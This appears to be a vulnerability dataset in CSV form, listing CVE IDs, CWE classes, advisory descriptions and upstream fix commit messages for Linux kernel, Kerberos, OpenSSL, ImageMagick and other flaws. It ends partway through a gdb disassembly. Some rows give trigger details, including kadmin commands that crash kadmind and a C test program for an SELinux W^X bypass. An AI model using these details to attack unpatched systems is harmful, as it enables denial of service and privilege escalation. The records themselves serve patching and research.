CVE-2017-11368,CWE-617,2017-08-09,"In MIT Kerberos 5 (aka krb5) 1.7 and later, an authenticated attacker can cause a KDC assertion failure by sending invalid S4U2Self or S4U2Proxy requests.","Assign status values if S4U2Self padata fails to decode, if an S4U2Proxy request uses invalid KDC options, or if an S4U2Proxy request uses an evidence ticket which does not match the canonicalized request server principal name.  Reported by Samuel Cabrero.  If a status value is not assigned during KDC processing, default to ""UNKNOWN_REASON"" rather than failing an assertion.  This change will prevent future denial of service bugs due to similar mistakes, and will allow us to omit assigning status values for unlikely errors such as small memory allocation failures.  CVE-2017-11368:  In MIT krb5 1.7 and later, an authenticated attacker can cause an assertion failure in krb5kdc by sending an invalid S4U2Self or S4U2Proxy request.    CVSSv3 Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H/E:H/RL:O/RC:C  ticket: 8599 (new) target_version: 1.15-next target_version: 1.14-next tags: pullup"
CVE-2011-4594,CWE-476,2012-05-17,"The __sys_sendmsg function in net/socket.c in the Linux kernel before 3.1 allows local users to cause a denial of service (system crash) via crafted use of the sendmmsg system call, leading to an incorrect pointer dereference.","Dereferencing a user pointer directly from kernel-space without going through the copy_from_user family of functions is a bad idea. Two of such usages can be found in the sendmsg code path called from sendmmsg, added by  commit c71d8eb upstream. commit 5b47b80 in the 3.0-stable tree.  Usages are performed through memcmp() and memcpy() directly. Fix those by using the already copied msg_sys structure instead of the __user *msg structure. Note that msg_sys can be set to NULL by verify_compat_iovec() or verify_iovec(), which requires additional NULL pointer checks.  Signed-off-by: Mathieu Desnoyers <mathieu.desnoyers@efficios.com> Signed-off-by: David Goulet <dgoulet@ev0ke.net> CC: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> CC: Anton Blanchard <anton@samba.org> CC: David S. Miller <davem@davemloft.net> CC: stable <stable@kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-1791,CWE-362,2015-06-12,"Race condition in the ssl3_get_new_session_ticket function in ssl/s3_clnt.c in OpenSSL before 0.9.8zg, 1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b, when used for a multi-threaded client, allows remote attackers to cause a denial of service (double free and application crash) or possibly have unspecified other impact by providing a NewSessionTicket during an attempt to reuse a ticket that had been obtained earlier.",If a NewSessionTicket is received by a multi-threaded client when attempting to reuse a previous ticket then a race condition can occur potentially leading to a double free of the ticket data.  CVE-2015-1791  This also fixes RT#3808 where a session ID is changed for a session already in the client session cache. Since the session ID is the key to the cache this breaks the cache access.  Parts of this patch were inspired by this Akamai change: akamai@c0bf69a  Reviewed-by: Rich Salz <rsalz@openssl.org>
CVE-2014-9496,,2015-01-16,"The sd2_parse_rsrc_fork function in sd2.c in libsndfile allows attackers to have unspecified impact via vectors related to a (1) map offset or (2) rsrc marker, which triggers an out-of-bounds read.",Closes: #93
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2013-1858,CWE-264,2013-04-05,"The clone system-call implementation in the Linux kernel before 3.8.3 does not properly handle a combination of the CLONE_NEWUSER and CLONE_FS flags, which allows local users to gain privileges by calling chroot and leveraging the sharing of the / directory between a parent process and a child process.","Don't allowing sharing the root directory with processes in a different user namespace.  There doesn't seem to be any point, and to allow it would require the overhead of putting a user namespace reference in fs_struct (for permission checks) and incrementing that reference count on practically every call to fork.  So just perform the inexpensive test of forbidding sharing fs_struct acrosss processes in different user namespaces.  We already disallow other forms of threading when unsharing a user namespace so this should be no real burden in practice.  This updates setns, clone, and unshare to disallow multiple user namespaces sharing an fs_struct.  Cc: stable@vger.kernel.org Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-8062,CWE-119,2017-04-23,"drivers/media/usb/dvb-usb/dw2102.c in the Linux kernel 4.9.x and 4.10.x before 4.10.4 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","On Kernel 4.9, WARNINGs about doing DMA on stack are hit at the dw2102 driver: one in su3000_power_ctrl() and the other in tt_s2_4600_frontend_attach().  Both were due to the use of buffers on the stack as parameters to dvb_usb_generic_rw() and the resulting attempt to do DMA with them.  The device was non-functional as a result.  So, switch this driver over to use a buffer within the device state structure, as has been done with other DVB-USB drivers.  Tested with TechnoTrend TT-connect S2-4600.  [mchehab@osg.samsung.com: fixed a warning at su3000_i2c_transfer() that  state var were dereferenced before check 'd'] Signed-off-by: Jonathan McDowell <noodles@earth.li> Cc: <stable@vger.kernel.org> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>"
CVE-2016-3138,,2016-05-02,The acm_probe function in drivers/usb/class/cdc-acm.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a USB device without both a control and a data endpoint descriptor.,An attack has become available which pretends to be a quirky device circumventing normal sanity checks and crashes the kernel by an insufficient number of interfaces. This patch adds a check to the code path for quirky devices.  Signed-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2018-16435,CWE-190,2018-09-04,"Little CMS (aka Little Color Management System) 2.9 has an integer overflow in the AllocateDataSet function in cmscgats.c, leading to a heap-based buffer overflow in the SetData function via a crafted file in the second argument to cmsIT8LoadFromFile.",- Upgrade to 15.8 - Add check on CGATS memory allocation (thanks to Quang Nguyen for pointing out this)
CVE-2013-1415,CWE-476,2013-03-05,"The pkinit_check_kdc_pkid function in plugins/preauth/pkinit/pkinit_crypto_openssl.c in the PKINIT implementation in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.4 and 1.11.x before 1.11.1 does not properly handle errors during extraction of fields from an X.509 certificate, which allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via a malformed KRB5_PADATA_PK_AS_REQ AS-REQ request.","Don't dereference a null pointer when cleaning up.  The KDC plugin for PKINIT can dereference a null pointer when a malformed packet causes processing to terminate early, leading to a crash of the KDC process.  An attacker would need to have a valid PKINIT certificate or have observed a successful PKINIT authentication, or an unauthenticated attacker could execute the attack if anonymous PKINIT is enabled.  CVSSv2 vector: AV:N/AC:M/Au:N/C:N/I:N/A:C/E:P/RL:O/RC:C  This is a minimal commit for pullup; style fixes in a followup. [kaduk@mit.edu: reformat and edit commit message]  (cherry picked from commit c773d3c)  ticket: 7570 version_fixed: 1.11.1 status: resolved"
CVE-2017-13041,CWE-125,2017-09-14,The ICMPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp6.c:icmp6_nodeinfo_print().,This fixes a buffer over-read discovered by Kim Gwan Yeong.  Add a test using the capture file supplied by the reporter(s).
CVE-2014-5354,,2014-12-16,"plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c in MIT Kerberos 5 (aka krb5) 1.12.x and 1.13.x before 1.13.1, when the KDC uses LDAP, allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) by creating a database entry for a keyless principal, as demonstrated by a kadmin ""add_principal -nokey"" or ""purgekeys -all"" command.","Operations like ""kadmin -q 'addprinc -nokey foo'"" or ""kadmin -q 'purgekeys -all foo'"" result in principal entries with no keys present, so krb5_encode_krbsecretkey() would just return NULL, which then got unconditionally dereferenced in krb5_add_ber_mem_ldap_mod().  Apply some fixes to krb5_encode_krbsecretkey() to handle zero-key principals better, correct the test for an allocation failure, and slightly restructure the cleanup handler to be shorter and more appropriate for the usage.  Once it no longer short-circuits when n_key_data is zero, it will produce an array of length two with both entries NULL, which is treated as an empty list by the LDAP library, the correct behavior for a keyless principal.  However, attributes with empty values are only handled by the LDAP library for Modify operations, not Add operations (which only get a sequence of Attribute, with no operation field).  Therefore, only add an empty krbprincipalkey to the modlist when we will be performing a Modify, and not when we will be performing an Add, which is conditional on the (misspelled) create_standalone_prinicipal boolean.  CVE-2014-5354:  In MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause a NULL dereference by inserting into the database a principal entry which contains no long-term keys.  In order for the LDAP KDC backend to translate a principal entry from the database abstraction layer into the form expected by the LDAP schema, the principal's keys are encoded into a NULL-terminated array of length-value entries to be stored in the LDAP database.  However, the subroutine which produced this array did not correctly handle the case where no keys were present, returning NULL instead of an empty array, and the array was unconditionally dereferenced while adding to the list of LDAP operations to perform.  Versions of MIT krb5 prior to 1.12 did not expose a way for principal entries to have no long-term key material, and therefore are not vulnerable.      CVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:OF/RC:C  ticket: 8041 (new) tags: pullup target_version: 1.13.1 subject: kadmind with ldap backend crashes when putting keyless entries"
CVE-2016-7398,CWE-704,2019-09-06,A type confusion vulnerability in the merge_param() function of php_http_params.c in PHP's pecl-http extension 3.1.0beta2 (PHP 7) and earlier as well as 2.6.0beta2 (PHP 5) and earlier allows attackers to crash PHP and possibly execute arbitrary code via crafted HTTP requests.,
CVE-2018-10537,CWE-119,2018-04-29,An issue was discovered in WavPack 5.1.0 and earlier. The W64 parser component contains a vulnerability that allows writing to memory because ParseWave64HeaderConfig in wave64.c does not reject multiple format chunks.,
CVE-2013-6431,CWE-264,2013-12-09,"The fib6_add function in net/ipv6/ip6_fib.c in the Linux kernel before 3.11.5 does not properly implement error-code encoding, which allows local users to cause a denial of service (NULL pointer dereference and system crash) by leveraging the CAP_NET_ADMIN capability for an IPv6 SIOCADDRT ioctl call.","When the kernel is compiled with CONFIG_IPV6_SUBTREES, and we return with an error in fn = fib6_add_1(), then error codes are encoded into the return pointer e.g. ERR_PTR(-ENOENT). In such an error case, we write the error code into err and jump to out, hence enter the if(err) condition. Now, if CONFIG_IPV6_SUBTREES is enabled, we check for:    if (pn != fn && pn->leaf == rt)     ...   if (pn != fn && !pn->leaf && !(pn->fn_flags & RTN_RTINFO))     ...  Since pn is NULL and fn is f.e. ERR_PTR(-ENOENT), then pn != fn evaluates to true and causes a NULL-pointer dereference on further checks on pn. Fix it, by setting both NULL in error case, so that pn != fn already evaluates to false and no further dereference takes place.  This was first correctly implemented in 4a287eb (""IPv6 routing, NLM_F_* flag support: REPLACE and EXCL flags support, warn about missing CREATE flag""), but the bug got later on introduced by 188c517 (""ipv6: return errno pointers consistently for fib6_add_1()"").  Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Lin Ming <mlin@ss.pku.edu.cn> Cc: Matti Vaittinen <matti.vaittinen@nsn.com> Cc: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Matti Vaittinen <matti.vaittinen@nsn.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-8884,CWE-476,2017-03-28,The bmp_getdata function in libjasper/bmp/bmp_dec.c in JasPer 1.900.5 allows remote attackers to cause a denial of service (NULL pointer dereference) by calling the imginfo command with a crafted BMP image. NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-8690.,
CVE-2017-18248,CWE-20,2018-03-26,"The add_job function in scheduler/ipp.c in CUPS before 2.2.6, when D-Bus support is enabled, can be crashed by remote attackers by sending print jobs with an invalid username, related to a D-Bus notification.",- scheduler/ipp.c: Make sure requesting-user-name string is valid UTF-8.
CVE-2015-3193,CWE-200,2015-12-06,"The Montgomery squaring implementation in crypto/bn/asm/x86_64-mont5.pl in OpenSSL 1.0.2 before 1.0.2e on the x86_64 platform, as used by the BN_mod_exp function, mishandles carry propagation and produces incorrect output, which makes it easier for remote attackers to obtain sensitive private-key information via an attack against use of a (1) Diffie-Hellman (DH) or (2) Diffie-Hellman Ephemeral (DHE) ciphersuite.",
CVE-2014-3564,CWE-119,2014-10-20,"Multiple heap-based buffer overflows in the status_handler function in (1) engine-gpgsm.c and (2) engine-uiserver.c in GPGME before 1.5.1 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to ""different line lengths in a specific order.""",
CVE-2017-14107,CWE-770,2017-09-01,"The _zip_read_eocd64 function in zip_open.c in libzip before 1.3.0 mishandles EOCD records, which allows remote attackers to cause a denial of service (memory allocation failure in _zip_cdir_grow in zip_dirent.c) via a crafted ZIP archive.",
CVE-2015-7540,CWE-399,2015-12-29,"The LDAP server in the AD domain controller in Samba 4.x before 4.1.22 does not check return values to ensure successful ASN.1 memory allocation, which allows remote attackers to cause a denial of service (memory consumption and daemon crash) via crafted packets.",
CVE-2017-0379,CWE-200,2017-08-29,"Libgcrypt before 1.8.1 does not properly consider Curve25519 side-channel attacks, which makes it easier for attackers to discover a secret key, related to cipher/ecc.c and mpi/ec.c.",
CVE-2018-8099,CWE-415,2018-03-14,"Incorrect returning of an error code in the index.c:read_entry() function leads to a double free in libgit2 before v0.26.2, which allows an attacker to cause a denial of service via a crafted repository index file.","The function `read_entry` does not conform to our usual coding style of returning stuff via the out parameter and to use the return value for reporting errors. Due to most of our code conforming to that pattern, it has become quite natural for us to actually return `-1` in case there is any error, which has also slipped in with commit 5625d86 (index: support index v4, 2016-05-17). As the function returns an `size_t` only, though, the return value is wrapped around, causing the caller of `read_tree` to continue with an invalid index entry. Ultimately, this can lead to a double-free.  Improve code and fix the bug by converting the function to return the index entry size via an out parameter and only using the return value to indicate errors.  Reported-by: Krishna Ram Prakash R <krp@gtux.in> Reported-by: Vivek Parikh <viv0411.parikh@gmail.com>"
CVE-2017-9059,CWE-404,2017-05-18,"The NFSv4 implementation in the Linux kernel through 4.11.1 allows local users to cause a denial of service (resource consumption) by leveraging improper channel callback shutdown when unmounting an NFSv4 filesystem, aka a ""module reference and kernel daemon"" leak.","Pull nfsd updates from Bruce Fields:  ""Another RDMA update from Chuck Lever, and a bunch of miscellaneous   bugfixes""  * tag 'nfsd-4.12' of git://linux-nfs.org/~bfields/linux: (26 commits)   nfsd: Fix up the ""supattr_exclcreat"" attributes   nfsd: encoders mustn't use unitialized values in error cases   nfsd: fix undefined behavior in nfsd4_layout_verify   lockd: fix lockd shutdown race   NFSv4: Fix callback server shutdown   SUNRPC: Refactor svc_set_num_threads()   NFSv4.x/callback: Create the callback service through svc_create_pooled   lockd: remove redundant check on block   svcrdma: Clean out old XDR encoders   svcrdma: Remove the req_map cache   svcrdma: Remove unused RDMA Write completion handler   svcrdma: Reduce size of sge array in struct svc_rdma_op_ctxt   svcrdma: Clean up RPC-over-RDMA backchannel reply processing   svcrdma: Report Write/Reply chunk overruns   svcrdma: Clean up RDMA_ERROR path   svcrdma: Use rdma_rw API in RPC reply path   svcrdma: Introduce local rdma_rw API helpers   svcrdma: Clean up svc_rdma_get_inv_rkey()   svcrdma: Add helper to save pages under I/O   svcrdma: Eliminate RPCRDMA_SQ_DEPTH_MULT   ..."
CVE-2013-1943,CWE-20,2013-07-16,"The KVM subsystem in the Linux kernel before 3.0 does not check whether kernel addresses are specified during allocation of memory slots for use in a guest's physical address space, which allows local users to gain privileges or obtain sensitive information from kernel memory via a crafted application, related to arch/x86/kvm/paging_tmpl.h and virt/kvm/kvm_main.c.","This way, we can avoid checking the user space address many times when we read the guest memory.  Although we can do the same for write if we check which slots are writable, we do not care write now: reading the guest memory happens more often than writing.  [avi: change VERIFY_READ to VERIFY_WRITE]  Signed-off-by: Takuya Yoshikawa <yoshikawa.takuya@oss.ntt.co.jp> Signed-off-by: Avi Kivity <avi@redhat.com>"
CVE-2016-10044,CWE-264,2017-02-07,"The aio_mount function in fs/aio.c in the Linux kernel before 4.7.7 does not properly restrict execute access, which makes it easier for local users to bypass intended SELinux W^X policy restrictions, and consequently gain privileges, via an io_setup system call.","This ensures that do_mmap() won't implicitly make AIO memory mappings executable if the READ_IMPLIES_EXEC personality flag is set.  Such behavior is problematic because the security_mmap_file LSM hook doesn't catch this case, potentially permitting an attacker to bypass a W^X policy enforced by SELinux.  I have tested the patch on my machine.  To test the behavior, compile and run this:      #define _GNU_SOURCE     #include <unistd.h>     #include <sys/personality.h>     #include <linux/aio_abi.h>     #include <err.h>     #include <stdlib.h>     #include <stdio.h>     #include <sys/syscall.h>      int main(void) {         personality(READ_IMPLIES_EXEC);         aio_context_t ctx = 0;         if (syscall(__NR_io_setup, 1, &ctx))             err(1, ""io_setup"");          char cmd[1000];         sprintf(cmd, ""cat /proc/%d/maps | grep -F '/[aio]'"",             (int)getpid());         system(cmd);         return 0;     }  In the output, ""rw-s"" is good, ""rwxs"" is bad.  Signed-off-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-14502,CWE-125,2017-09-17,"read_header in archive_read_support_format_rar.c in libarchive 3.3.2 suffers from an off-by-one error for UTF-16 names in RAR archives, leading to an out-of-bounds read in archive_read_format_rar_read_header.",Reported-By: OSS-Fuzz issue 573
CVE-2011-2699,,2012-05-24,"The IPv6 implementation in the Linux kernel before 3.1 does not generate Fragment Identification values separately for each destination, which makes it easier for remote attackers to cause a denial of service (disrupted networking) by predicting these values and sending crafted packets.","IPv6 fragment identification generation is way beyond what we use for IPv4 : It uses a single generator. Its not scalable and allows DOS attacks.  Now inetpeer is IPv6 aware, we can use it to provide a more secure and scalable frag ident generator (per destination, instead of system wide)  This patch : 1) defines a new secure_ipv6_id() helper 2) extends inet_getid() to provide 32bit results 3) extends ipv6_select_ident() with a new dest parameter  Reported-by: Fernando Gont <fernando@gont.com.ar> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-1000050,CWE-119,2018-02-09,"Sean Barrett stb_vorbis version 1.12 and earlier contains a Buffer Overflow vulnerability in All vorbis decoding paths. that can result in memory corruption, denial of service, comprised execution of host program. This attack appear to be exploitable via Victim must open a specially crafted Ogg Vorbis file. This vulnerability appears to have been fixed in 1.13.",
CVE-2018-16513,CWE-704,2018-09-05,"In Artifex Ghostscript before 9.24, attackers able to supply crafted PostScript files could use a type confusion in the setcolor function to crash the interpreter or possibly have unspecified other impact.",
CVE-2016-6156,CWE-362,2016-08-06,"Race condition in the ec_device_ioctl_xcmd function in drivers/platform/chrome/cros_ec_dev.c in the Linux kernel before 4.7 allows local users to cause a denial of service (out-of-bounds array access) by changing a certain size value, aka a ""double fetch"" vulnerability.","We verify ""u_cmd.outsize"" and ""u_cmd.insize"" but we need to make sure that those values have not changed between the two copy_from_user() calls.  Otherwise it could lead to a buffer overflow.  Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value. We should use the new smaller value so we don't copy too much data to the user.  Reported-by: Pengfei Wang <wpengfeinudt@gmail.com> Fixes: a841178 ('mfd: cros_ec: Use a zero-length array for command data') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Kees Cook <keescook@chromium.org> Tested-by: Gwendal Grignou <gwendal@chromium.org> Cc: <stable@vger.kernel.org> # v4.2+ Signed-off-by: Olof Johansson <olof@lixom.net>"
CVE-2016-1245,CWE-119,2017-02-22,"It was discovered that the zebra daemon in Quagga before 1.0.20161017 suffered from a stack-based buffer overflow when processing IPv6 Neighbor Discovery messages. The root cause was relying on BUFSIZ to be compatible with a message size; however, BUFSIZ is system-dependent.",
CVE-2019-13308,CWE-787,2019-07-05,ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow in MagickCore/fourier.c in ComplexImage.,
CVE-2016-7540,CWE-19,2017-04-20,coders/rgf.c in ImageMagick before 6.9.4-10 allows remote attackers to cause a denial of service (assertion failure) by converting an image to rgf format.,"The rgf format (LEGO MINDSTORMS EV3 images) caused a software abort because exception == NULL. When WriteRGFImage is called from WriteImage, it is only passed two parameters, not three. So, removed the extra parameter and use image->exception instead as in other coders."
CVE-2017-18204,,2018-02-27,The ocfs2_setattr function in fs/ocfs2/file.c in the Linux kernel before 4.14.2 allows local users to cause a denial of service (deadlock) via DIO requests.,"we should wait dio requests to finish before inode lock in ocfs2_setattr(), otherwise the following deadlock will happen:  process 1                  process 2                    process 3 truncate file 'A'          end_io of writing file 'A'   receiving the bast messages ocfs2_setattr  ocfs2_inode_lock_tracker   ocfs2_inode_lock_full  inode_dio_wait   __inode_dio_wait   -->waiting for all dio   requests finish                                                         dlm_proxy_ast_handler                                                          dlm_do_local_bast                                                           ocfs2_blocking_ast                                                            ocfs2_generic_handle_bast                                                             set OCFS2_LOCK_BLOCKED flag                         dio_end_io                          dio_bio_end_aio                           dio_complete                            ocfs2_dio_end_io                             ocfs2_dio_end_io_write                              ocfs2_inode_lock                               __ocfs2_cluster_lock                                ocfs2_wait_for_mask                                -->waiting for OCFS2_LOCK_BLOCKED                                flag to be cleared, that is waiting                                for 'process 1' unlocking the inode lock                            inode_dio_end                            -->here dec the i_dio_count, but will never                            be called, so a deadlock happened.  Link: http://lkml.kernel.org/r/59F81636.70508@huawei.com Signed-off-by: Alex Chen <alex.chen@huawei.com> Reviewed-by: Jun Piao <piaojun@huawei.com> Reviewed-by: Joseph Qi <jiangqi903@gmail.com> Acked-by: Changwei Ge <ge.changwei@h3c.com> Cc: Mark Fasheh <mfasheh@versity.com> Cc: Joel Becker <jlbec@evilplan.org> Cc: Junxiao Bi <junxiao.bi@oracle.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-7515,CWE-125,2017-04-19,The ReadRLEImage function in coders/rle.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via vectors related to the number of pixels.,
CVE-2012-4444,,2012-12-21,The ip6_frag_queue function in net/ipv6/reassembly.c in the Linux kernel before 2.6.36 allows remote attackers to bypass intended network restrictions via overlapping IPv6 fragments.,RFC5722 prohibits reassembling fragments when some data overlaps.  Bug spotted by Zhang Zuotao <zuotao.zhang@6wind.com>.  Signed-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2015-8839,CWE-362,2016-05-02,Multiple race conditions in the ext4 filesystem implementation in the Linux kernel before 4.5 allow local users to cause a denial of service (disk corruption) by writing to a page that is associated with a different user's file after unsynchronized hole punching and page-fault handling.,"Currently, page faults and hole punching are completely unsynchronized. This can result in page fault faulting in a page into a range that we are punching after truncate_pagecache_range() has been called and thus we can end up with a page mapped to disk blocks that will be shortly freed. Filesystem corruption will shortly follow. Note that the same race is avoided for truncate by checking page fault offset against i_size but there isn't similar mechanism available for punching holes.  Fix the problem by creating new rw semaphore i_mmap_sem in inode and grab it for writing over truncate, hole punching, and other functions removing blocks from extent tree and for read over page faults. We cannot easily use i_data_sem for this since that ranks below transaction start and we need something ranking above it so that it can be held over the whole truncate / hole punching operation. Also remove various workarounds we had in the code to reduce race window when page fault could have created pages with stale mapping information.  Signed-off-by: Jan Kara <jack@suse.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
CVE-2016-10012,CWE-119,2017-01-05,"The shared memory manager (associated with pre-authentication compression) in sshd in OpenSSH before 7.4 does not ensure that a bounds check is enforced by all compilers, which might allows local users to gain privileges by leveraging access to a sandboxed privilege-separation process, related to the m_zback and m_zlib data structures.","early in the protocol probably seemed reasonable in the 1990s, but today it's clearly a bad idea in terms of both cryptography (cf. multiple compression oracle attacks in TLS) and attack surface.  Moreover, to support it across privilege-separation zlib needed the assistance of a complex shared-memory manager that made the required attack surface considerably larger.  Prompted by Guido Vranken pointing out a compiler-elided security check in the shared memory manager found by Stack (http://css.csail.mit.edu/stack/); ok deraadt@ markus@  NB. pre-auth authentication has been disabled by default in sshd for >10 years."
CVE-2019-11833,CWE-908,2019-05-15,"fs/ext4/extents.c in the Linux kernel through 5.1.2 does not zero out the unused memory region in the extent tree block, which might allow local users to obtain sensitive information by reading uninitialized data in the filesystem.",This commit zeroes out the unused memory region in the buffer_head corresponding to the extent metablock after writing the extent header and the corresponding extent node entries.  This is done to prevent random uninitialized data from getting into the filesystem when the extent block is synced.  This fixes CVE-2019-11833.  Signed-off-by: Sriram Rajagopalan <sriramr@arista.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu> Cc: stable@kernel.org
CVE-2018-19475,,2018-11-23,psi/zdevice2.c in Artifex Ghostscript before 9.26 allows remote attackers to bypass intended access restrictions because available stack space is not checked when the device remains the same.,
CVE-2017-5577,CWE-388,2017-02-06,"The vc4_get_bcl function in drivers/gpu/drm/vc4/vc4_gem.c in the VideoCore DRM driver in the Linux kernel before 4.9.7 does not set an errno value upon certain overflow detections, which allows local users to cause a denial of service (incorrect pointer dereference and OOPS) via inconsistent size values in a VC4_SUBMIT_CL ioctl call.","By failing to set the errno, we'd continue on to trying to set up the RCL, and then oops on trying to dereference the tile_bo that binning validation should have set up.  Reported-by: Ingo Molnar <mingo@kernel.org> Signed-off-by: Eric Anholt <eric@anholt.net> Fixes: d5b1a78 (""drm/vc4: Add support for drawing 3D frames."")"
CVE-2013-4119,CWE-476,2016-10-03,FreeRDP before 1.1.0-beta+2013071101 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) by disconnecting before authentication has finished.,If sec pointer isn't invalidated after creation it is not possible to check if the upper and lower pointers are valid.  This fixes a segfault in the server part if the client disconnects before the authentication was finished.
CVE-2018-15861,CWE-476,2018-08-25,Unchecked NULL pointer usage in ExprResolveLhs in xkbcomp/expr.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file that triggers an xkb_intern_atom failure.,"Every user of ExprReturnLhs goes on to unconditionally dereference the field return, which can be NULL if xkb_intern_atom fails. Return false if this is the case, so we fail safely.  testcase: splice geometry data into interp  Signed-off-by: Daniel Stone <daniels@collabora.com>"
CVE-2016-10375,CWE-119,2017-05-26,Yodl before 3.07.01 has a Buffer Over-read in the queue_push function in queue/queuepush.c.,
CVE-2017-12669,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteCALSImage in coders/cals.c.,
CVE-2019-3817,CWE-416,2019-03-27,"A use-after-free flaw has been discovered in libcomps before version 0.1.10 in the way ObjMRTrees are merged. An attacker, who is able to make an application read a crafted comps XML file, may be able to crash the application or execute malicious code.",The added field is not used at all in many places and it is probably the left-over of some copy-paste.
CVE-2018-15594,CWE-200,2018-08-20,"arch/x86/kernel/paravirt.c in the Linux kernel before 4.18.1 mishandles certain indirect calls, which makes it easier for attackers to conduct Spectre-v2 attacks against paravirtual guests.","Nadav reported that on guests we're failing to rewrite the indirect calls to CALLEE_SAVE paravirt functions. In particular the pv_queued_spin_unlock() call is left unpatched and that is all over the place. This obviously wrecks Spectre-v2 mitigation (for paravirt guests) which relies on not actually having indirect calls around.  The reason is an incorrect clobber test in paravirt_patch_call(); this function rewrites an indirect call with a direct call to the _SAME_ function, there is no possible way the clobbers can be different because of this.  Therefore remove this clobber check. Also put WARNs on the other patch failure case (not enough room for the instruction) which I've not seen trigger in my (limited) testing.  Three live kernel image disassemblies for lock_sock_nested (as a small function that illustrates the problem nicely). PRE is the current situation for guests, POST is with this patch applied and NATIVE is with or without the patch for !guests.  PRE:  (gdb) disassemble lock_sock_nested Dump of assembler code for function lock_sock_nested:    0xffffffff817be970 <+0>:     push   %rbp    0xffffffff817be971 <+1>:     mov    %rdi,%rbp    0xffffffff817be974 <+4>:     push   %rbx    0xffffffff817be975 <+5>:     lea    0x88(%rbp),%rbx    0xffffffff817be97c <+12>:    callq  0xffffffff819f7160 <_cond_resched>    0xffffffff817be981 <+17>:    mov    %rbx,%rdi    0xffffffff817be984 <+20>:    callq  0xffffffff819fbb00 <_raw_spin_lock_bh>    0xffffffff817be989 <+25>:    mov    0x8c(%rbp),%eax    0xffffffff817be98f <+31>:    test   %eax,%eax    0xffffffff817be991 <+33>:    jne    0xffffffff817be9ba <lock_sock_nested+74>    0xffffffff817be993 <+35>:    movl   $0x1,0x8c(%rbp)    0xffffffff817be99d <+45>:    mov    %rbx,%rdi    0xffffffff817be9a0 <+48>:    callq  *0xffffffff822299e8    0xffffffff817be9a7 <+55>:    pop    %rbx    0xffffffff817be9a8 <+56>:    pop    %rbp    0xffffffff817be9a9 <+57>:    mov    $0x200,%esi    0xffffffff817be9ae <+62>:    mov    $0xffffffff817be993,%rdi    0xffffffff817be9b5 <+69>:    jmpq   0xffffffff81063ae0 <__local_bh_enable_ip>    0xffffffff817be9ba <+74>:    mov    %rbp,%rdi    0xffffffff817be9bd <+77>:    callq  0xffffffff817be8c0 <__lock_sock>    0xffffffff817be9c2 <+82>:    jmp    0xffffffff817be993 <lock_sock_nested+35> End of assembler dump.  POST:  (gdb) disassemble lock_sock_nested Dump of assembler code for function lock_sock_nested:    0xffffffff817be970 <+0>:     push   %rbp    0xffffffff817be971 <+1>:     mov    %rdi,%rbp    0xffffffff817be974 <+4>:     push   %rbx    0xffffffff817be975 <+5>:     lea    0x88(%rbp),%rbx    0xffffffff817be97c <+12>:    callq  0xffffffff819f7160 <_cond_resched>    0xffffffff817be981 <+17>:    mov    %rbx,%rdi    0xffffffff817be984 <+20>:    callq  0xffffffff819fbb00 <_raw_spin_lock_bh>    0xffffffff817be989 <+25>:    mov    0x8c(%rbp),%eax    0xffffffff817be98f <+31>:    test   %eax,%eax    0xffffffff817be991 <+33>:    jne    0xffffffff817be9ba <lock_sock_nested+74>    0xffffffff817be993 <+35>:    movl   $0x1,0x8c(%rbp)    0xffffffff817be99d <+45>:    mov    %rbx,%rdi    0xffffffff817be9a0 <+48>:    callq  0xffffffff810a0c20 <__raw_callee_save___pv_queued_spin_unlock>    0xffffffff817be9a5 